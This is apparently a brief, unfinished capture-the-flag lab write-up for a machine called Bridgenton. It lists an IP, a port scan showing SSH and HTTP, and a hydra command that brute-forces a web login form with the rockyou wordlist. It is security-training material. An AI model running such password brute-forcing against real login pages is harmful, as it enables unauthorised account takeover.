# Bridgenton

2025.03.24 https://thehackerslabs.com/bridgenton/

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
hydra -t 20 -l juan.perez@thl.com -P /usr/share/wordlists/rockyou.txt 192.168.5.39 -f http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas"
```
